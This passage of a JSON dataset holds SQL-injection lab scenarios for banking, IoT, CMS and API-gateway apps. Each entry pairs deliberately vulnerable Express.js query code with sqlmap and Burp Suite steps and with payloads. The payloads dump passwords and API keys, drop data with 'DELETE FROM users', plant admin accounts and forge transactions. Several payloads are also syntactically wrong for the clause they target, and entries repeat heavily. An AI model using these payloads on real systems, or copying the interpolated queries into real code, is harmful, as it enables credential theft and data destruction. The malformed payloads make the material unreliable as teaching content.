    "Solution Steps": [
      "Use Postman to send requests to the API endpoint with the 'limit' parameter.",
      "Inject SQL payloads into the 'limit' parameter, such as '1, (SELECT api_key FROM api_clients LIMIT 1)--'.",
      "Check the response for sensitive data leaks or errors.",
      "Use sqlmap to automate the exploitation and retrieve sensitive data from the API clients.",
      "Verify the successful extraction of sensitive API credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-endpoint', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM api_clients LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1, (SELECT api_key FROM api_clients LIMIT 1)--",
      "2, (SELECT api_secret FROM api_clients LIMIT 1)--",
      "3, (SELECT api_token FROM api_clients LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal\u00e2\u20ac\u2122s report generation feature improperly handles user input in the HAVING clause, allowing SQL injection. To solve: Exploit the HAVING clause to retrieve sensitive user and account information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the report generation endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status HAVING 1=1 UNION SELECT username, account_number FROM users--'.",
      "Check the response for any sensitive information or errors.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of sensitive user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/generate-report', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status HAVING 1=1 UNION SELECT username, account_number FROM users--",
      "amount HAVING 1=1 UNION SELECT username, email FROM users--",
      "type HAVING 1=1 UNION SELECT username, password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard improperly uses user input in the ORDER BY clause, allowing SQL injection. To solve: Exploit the ORDER BY clause to retrieve sensitive device configuration data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the IoT device endpoint.",
      "Inject SQL payloads into the 'order' parameter, such as 'name ASC, (SELECT device_config FROM devices LIMIT 1)--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device configuration data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT * FROM devices ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "name ASC, (SELECT device_config FROM devices LIMIT 1)--",
      "model DESC, (SELECT ip_address FROM devices LIMIT 1)--",
      "status ASC, (SELECT serial_number FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in DELETE Clause",
    "Lab Description": "The CMS allows administrators to delete posts via user input, but fails to sanitize the input properly, leaving it vulnerable to SQL injection. To solve: Inject SQL into the DELETE clause to remove data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the post deletion endpoint.",
      "Inject SQL payloads into the 'post_id' parameter, such as '1; DELETE FROM users--'.",
      "Observe the server\u00e2\u20ac\u2122s response to confirm the deletion of unauthorized data.",
      "Use sqlmap to automate the exploitation and perform the deletion.",
      "Verify the successful deletion of user data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-post', (req, res) => {\n  const { post_id } = req.body;\n  const query = `DELETE FROM posts WHERE id = ${post_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Post deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM users--",
      "2; DELETE FROM products--",
      "3; DELETE FROM orders--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in WHERE Clause",
    "Lab Description": "The banking portal filters transactions using user input in the WHERE clause, but does not sanitize it properly. To solve: Exploit the WHERE clause to retrieve sensitive account data from the transactions table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transactions endpoint.",
      "Inject SQL payloads into the 'date' parameter, such as '2021-01-01' OR '1'='1';--'.",
      "Observe the response for any unexpected data or leaks.",
      "Use sqlmap to automate the exploitation and retrieve sensitive transaction data.",
      "Verify the successful extraction of sensitive account data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const date = req.query.date;\n  const query = `SELECT * FROM transactions WHERE date = '${date}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR '1'='1';--",
      "' OR '1'='1' AND 'a'='a';--",
      "' OR 1=1; --"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API Gateway uses user input in the ORDER BY clause to sort API results, leaving it vulnerable to SQL injection. To solve: Exploit the ORDER BY clause to extract sensitive user credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a request to the API endpoint with the 'order' parameter.",
      "Inject SQL payloads into the 'order' parameter, such as 'username ASC, (SELECT password FROM users LIMIT 1)--'.",
      "Check the response for any sensitive data leaks.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api-endpoint', (req, res) => {\n  const order = req.query.order;\n  const query = `SELECT * FROM users ORDER BY ${order}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "username ASC, (SELECT password FROM users LIMIT 1)--",
      "email ASC, (SELECT password FROM users LIMIT 1)--",
      "role DESC, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in LIMIT Clause",
    "Lab Description": "The IoT dashboard uses user input in the LIMIT clause to paginate results. To solve: Exploit the LIMIT clause to extract device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device listing endpoint.",
      "Inject SQL payloads into the 'limit' parameter, such as '1, (SELECT ip_address FROM devices LIMIT 1)--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device configuration data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const limit = req.query.limit;\n  const query = `SELECT * FROM devices LIMIT ${limit}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1, (SELECT ip_address FROM devices LIMIT 1)--",
      "2, (SELECT serial_number FROM devices LIMIT 1)--",
      "3, (SELECT device_name FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UPDATE Clause",
    "Lab Description": "The CMS allows administrators to update articles but does not sanitize the input used in the UPDATE clause. To solve: Inject SQL into the UPDATE clause to modify article data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the article update endpoint.",
      "Inject SQL payloads into the 'article_id' parameter, such as '1; UPDATE articles SET content='Injected content' WHERE id=1--'.",
      "Observe the response for any anomalies indicating successful injection.",
      "Use sqlmap to automate the exploitation and modify the article content.",
      "Verify the successful modification of article data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-article', (req, res) => {\n  const { article_id, content } = req.body;\n  const query = `UPDATE articles SET content = '${content}' WHERE id = ${article_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Article updated' });\n  });\n});",
    "payloads": [
      "1; UPDATE articles SET content='Injected content' WHERE id=1--",
      "2; UPDATE articles SET title='Injected title' WHERE id=2--",
      "3; UPDATE articles SET content='Malicious content' WHERE id=3--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal uses user input in the HAVING clause of SQL queries to filter transactions. To solve: Exploit the HAVING clause to extract sensitive account information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction report endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'status HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for sensitive data leakage or errors.",
      "Use sqlmap to automate the exploitation and extract sensitive user credentials.",
      "Verify the successful extraction of user information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-report', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "status HAVING 1=1 UNION SELECT username, password FROM users--",
      "amount HAVING 1=1 UNION SELECT username, email FROM users--",
      "type HAVING 1=1 UNION SELECT username, role FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in WHERE Clause",
    "Lab Description": "The IoT dashboard queries devices based on user input in the WHERE clause. To solve: Exploit the WHERE clause to extract sensitive device configurations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device listing endpoint.",
      "Inject SQL payloads into the 'type' parameter, such as 'type = 'camera' OR 1=1--'.",
      "Examine the response for any leaked device information.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device configuration data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const type = req.query.type;\n  const query = `SELECT * FROM devices WHERE type = '${type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' OR 'a'='a'--",
      "' OR '1'='1' AND 'b'='b'--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in INSERT Clause",
    "Lab Description": "The CMS allows users to submit content for publication, but fails to sanitize input in the INSERT clause. To solve: Inject SQL into the INSERT statement to create a new admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content submission endpoint.",
      "Inject SQL payloads into the 'content' parameter, such as 'test', '1; INSERT INTO users (username, password, role) VALUES ('admin', 'adminpassword', 'admin')--'.",
      "Observe the response to confirm the successful submission of the malicious request.",
      "Use sqlmap to automate the exploitation and add a new admin user.",
      "Verify the successful creation of a new admin user."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/submit-content', (req, res) => {\n  const { title, content } = req.body;\n  const query = `INSERT INTO content (title, content) VALUES ('${title}', '${content}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Content submitted' });\n  });\n});",
    "payloads": [
      "'1; INSERT INTO users (username, password, role) VALUES ('admin', 'adminpassword', 'admin')--",
      "'2; INSERT INTO users (username, password, role) VALUES ('malicious', 'password', 'user')--",
      "'3; INSERT INTO users (username, password, role) VALUES ('attacker', 'attackerpassword', 'user')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in SELECT Clause",
    "Lab Description": "The banking portal allows users to check their transaction history but fails to sanitize user input in the SELECT clause. To solve: Exploit the SELECT clause to extract sensitive account data from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Inject SQL payloads into the 'transaction_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const transaction_id = req.query.transaction_id;\n  const query = `SELECT * FROM transactions WHERE transaction_id = ${transaction_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT username, email FROM users--",
      "3 UNION SELECT role, password FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in GROUP BY Clause",
    "Lab Description": "The IoT dashboard uses user input in the GROUP BY clause to group devices by their type. To solve: Exploit the GROUP BY clause to extract sensitive device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device query endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'type GROUP BY id HAVING 1=1 UNION SELECT ip_address FROM devices--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-query', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM devices GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "type GROUP BY id HAVING 1=1 UNION SELECT ip_address FROM devices--",
      "status GROUP BY id HAVING 1=1 UNION SELECT device_name FROM devices--",
      "model GROUP BY id HAVING 1=1 UNION SELECT mac_address FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in DELETE Clause",
    "Lab Description": "The CMS allows users to delete their own content but fails to sanitize the input used in the DELETE clause. To solve: Inject SQL into the DELETE clause to delete other users' content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the delete content endpoint.",
      "Inject SQL payloads into the 'content_id' parameter, such as '1; DELETE FROM content WHERE user_id = 2--'.",
      "Observe the response for any anomalies indicating successful injection.",
      "Use sqlmap to automate the exploitation and delete another user's content.",
      "Verify the successful deletion of unauthorized content."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/delete-content', (req, res) => {\n  const content_id = req.body.content_id;\n  const query = `DELETE FROM content WHERE id = ${content_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Content deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM content WHERE user_id = 2--",
      "2; DELETE FROM content WHERE user_id = 3--",
      "3; DELETE FROM content WHERE user_id = 4--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in INSERT Clause",
    "Lab Description": "The API Gateway allows users to add new records but fails to sanitize the input used in the INSERT clause. To solve: Inject SQL into the INSERT statement to add new users to the system.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the API endpoint with the 'name' and 'email' parameters.",
      "Inject SQL payloads into the 'email' parameter, such as '1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--'.",
      "Check the response for any successful insertion of malicious data.",
      "Use sqlmap to automate the exploitation and insert a new user into the system.",
      "Verify the successful creation of a new user."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-record', (req, res) => {\n  const { name, email } = req.body;\n  const query = `INSERT INTO records (name, email) VALUES ('${name}', '${email}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record added' });\n  });\n});",
    "payloads": [
      "1); INSERT INTO users (username, password) VALUES ('attacker', 'password')--",
      "2); INSERT INTO users (username, password) VALUES ('admin', 'adminpassword')--",
      "3); INSERT INTO users (username, password) VALUES ('hacker', 'hackpassword')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in HAVING Clause",
    "Lab Description": "The banking portal allows users to filter transactions using the HAVING clause. To solve: Exploit the HAVING clause to extract sensitive transaction data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction filter endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'amount HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of sensitive transaction information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-filter', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount HAVING 1=1 UNION SELECT username, password FROM users--",
      "date HAVING 1=1 UNION SELECT email, password FROM users--",
      "status HAVING 1=1 UNION SELECT role, username FROM users--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in ORDER BY Clause",
    "Lab Description": "The IoT dashboard allows sorting of device data by user input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to extract sensitive device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device list endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'id DESC, (SELECT ip_address FROM devices LIMIT 1)--'.",
      "Observe the response for any device-related data leakage.",
      "Use sqlmap to automate the exploitation and retrieve sensitive device details.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-list', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM devices ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "id DESC, (SELECT ip_address FROM devices LIMIT 1)--",
      "model ASC, (SELECT serial_number FROM devices LIMIT 1)--",
      "type DESC, (SELECT mac_address FROM devices LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in WHERE Clause",
    "Lab Description": "The CMS allows administrators to view articles by category using the WHERE clause. To solve: Inject SQL into the WHERE clause to retrieve all articles in the system, including hidden ones.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the category article query endpoint.",
      "Inject SQL payloads into the 'category' parameter, such as '1 OR 1=1--'.",
      "Observe the response for any hidden or sensitive article data.",
      "Use sqlmap to automate the exploitation and extract all articles.",
      "Verify the successful extraction of articles from the system."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/category-articles', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM articles WHERE category = '${category}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' OR 'a'='a'--",
      "' OR '1'='1' AND 'b'='b'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to filter account balances by grouping. To solve: Exploit the GROUP BY clause to extract sensitive user balance information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the balance report endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'balance GROUP BY user_id HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and extract user credentials.",
      "Verify the successful extraction of user account balance data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/balance-report', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM balances GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "balance GROUP BY user_id HAVING 1=1 UNION SELECT username, password FROM users--",
      "balance GROUP BY user_id HAVING 1=1 UNION SELECT email, password FROM users--",
      "balance GROUP BY user_id HAVING 1=1 UNION SELECT role, username FROM users--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in WHERE Clause",
    "Lab Description": "The API Gateway allows users to query specific records but fails to sanitize the input in the WHERE clause. To solve: Exploit the WHERE clause to extract user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query records endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Check the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-records', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `SELECT * FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT username, email FROM users--",
      "3 UNION SELECT role, password FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal allows users to sort transactions by date but fails to sanitize input in the ORDER BY clause. To solve: Exploit the ORDER BY clause to extract sensitive account data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Inject SQL payloads into the 'order_by' parameter, such as 'date DESC, (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const order_by = req.query.order_by;\n  const query = `SELECT * FROM transactions ORDER BY ${order_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "date DESC, (SELECT username FROM users LIMIT 1)--",
      "amount ASC, (SELECT password FROM users LIMIT 1)--",
      "date ASC, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard uses the HAVING clause to filter devices based on sensor data but fails to sanitize input. To solve: Exploit the HAVING clause to extract sensitive device data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the device query endpoint.",
      "Inject SQL payloads into the 'sensor_data' parameter, such as 'sensor_value HAVING 1=1 UNION SELECT ip_address FROM devices--'.",
      "Observe the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve device configurations.",
      "Verify the successful extraction of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-query', (req, res) => {\n  const sensor_data = req.query.sensor_data;\n  const query = `SELECT * FROM devices HAVING ${sensor_data}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "sensor_value HAVING 1=1 UNION SELECT ip_address FROM devices--",
      "sensor_value HAVING 1=1 UNION SELECT mac_address FROM devices--",
      "sensor_value HAVING 1=1 UNION SELECT device_name FROM devices--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UNION Clause",
    "Lab Description": "The CMS allows users to filter content based on tags but fails to sanitize user input in the UNION clause. To solve: Exploit the UNION clause to extract content-related data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the content filtering endpoint.",
      "Inject SQL payloads into the 'tag' parameter, such as 'tag UNION SELECT title, content FROM articles--'.",
      "Observe the response for any content data leakage.",
      "Use sqlmap to automate the exploitation and retrieve article content.",
      "Verify the successful extraction of articles from the system."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/filter-content', (req, res) => {\n  const tag = req.query.tag;\n  const query = `SELECT * FROM content WHERE tag = '${tag}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "tag UNION SELECT title, content FROM articles--",
      "tag UNION SELECT author, content FROM articles--",
      "tag UNION SELECT id, content FROM articles--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in SELECT Clause",
    "Lab Description": "The API Gateway allows users to query record details but fails to sanitize input in the SELECT clause. To solve: Exploit the SELECT clause to extract user data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the query records endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1 UNION SELECT username, password FROM users--'.",
      "Check the response for any sensitive data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user credentials.",
      "Verify the successful extraction of user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-records', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `SELECT * FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "1 UNION SELECT username, password FROM users--",
      "2 UNION SELECT username, email FROM users--",
      "3 UNION SELECT role, password FROM users--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in INSERT Clause",
    "Lab Description": "The banking portal allows users to add transactions but fails to sanitize input in the INSERT clause. To solve: Inject SQL to add fake transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction add endpoint.",
      "Inject SQL payloads into the 'amount' parameter, such as '1000); INSERT INTO transactions (amount, user_id) VALUES (1000, 1)--'.",
      "Observe the response for any successful transaction insertion.",
      "Use sqlmap to automate the exploitation and insert fake transactions.",
      "Verify the successful insertion of fake transaction data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/add-transaction', (req, res) => {\n  const { amount, user_id } = req.body;\n  const query = `INSERT INTO transactions (amount, user_id) VALUES ('${amount}', '${user_id}')`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Transaction added' });\n  });\n});",
    "payloads": [
      "1000); INSERT INTO transactions (amount, user_id) VALUES (1000, 1)--",
      "500); INSERT INTO transactions (amount, user_id) VALUES (500, 2)--",
      "200); INSERT INTO transactions (amount, user_id) VALUES (200, 3)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in UPDATE Clause",
    "Lab Description": "The IoT dashboard allows users to update device status but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify device data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the update device status endpoint.",
      "Inject SQL payloads into the 'status' parameter, such as 'active, (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any device status modification.",
      "Use sqlmap to automate the exploitation and modify device data.",
      "Verify the successful update of device data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-device', (req, res) => {\n  const { status, device_id } = req.body;\n  const query = `UPDATE devices SET status = '${status}' WHERE id = '${device_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Device status updated' });\n  });\n});",
    "payloads": [
      "active, (SELECT username FROM users LIMIT 1)--",
      "inactive, (SELECT password FROM users LIMIT 1)--",
      "active, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in UPDATE Clause",
    "Lab Description": "The CMS allows administrators to update article details but fails to sanitize input in the UPDATE clause. To solve: Exploit the UPDATE clause to modify article content.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the update article endpoint.",
      "Inject SQL payloads into the 'content' parameter, such as 'new content, (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any article content modification.",
      "Use sqlmap to automate the exploitation and modify the content of an article.",
      "Verify the successful modification of article data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-article', (req, res) => {\n  const { content, article_id } = req.body;\n  const query = `UPDATE articles SET content = '${content}' WHERE id = '${article_id}'`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Article updated' });\n  });\n});",
    "payloads": [
      "new content, (SELECT username FROM users LIMIT 1)--",
      "updated content, (SELECT password FROM users LIMIT 1)--",
      "new content, (SELECT email FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in DELETE Clause",
    "Lab Description": "The API Gateway allows users to delete specific records but fails to sanitize input in the DELETE clause. To solve: Exploit the DELETE clause to remove records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the delete record endpoint.",
      "Inject SQL payloads into the 'record_id' parameter, such as '1; DELETE FROM records--'.",
      "Check the response for successful record deletion.",
      "Use sqlmap to automate the exploitation and remove records from the database.",
      "Verify the successful deletion of records."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/delete-record', (req, res) => {\n  const record_id = req.query.record_id;\n  const query = `DELETE FROM records WHERE id = ${record_id}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json({ message: 'Record deleted' });\n  });\n});",
    "payloads": [
      "1; DELETE FROM records--",
      "2; DELETE FROM records--",
      "3; DELETE FROM records--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal allows users to view transactions grouped by category but fails to sanitize input in the GROUP BY clause. To solve: Exploit the GROUP BY clause to extract sensitive account information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction grouping endpoint.",
      "Inject SQL payloads into the 'group_by' parameter, such as 'category GROUP BY (SELECT username FROM users LIMIT 1)--'.",
      "Observe the response for any sensitive account data leakage.",
      "Use sqlmap to automate the exploitation and retrieve user data.",
      "Verify the successful extraction of user details."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction-group', (req, res) => {\n  const group_by = req.query.group_by;\n  const query = `SELECT * FROM transactions GROUP BY ${group_by}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "category GROUP BY (SELECT username FROM users LIMIT 1)--",
      "date GROUP BY (SELECT password FROM users LIMIT 1)--",
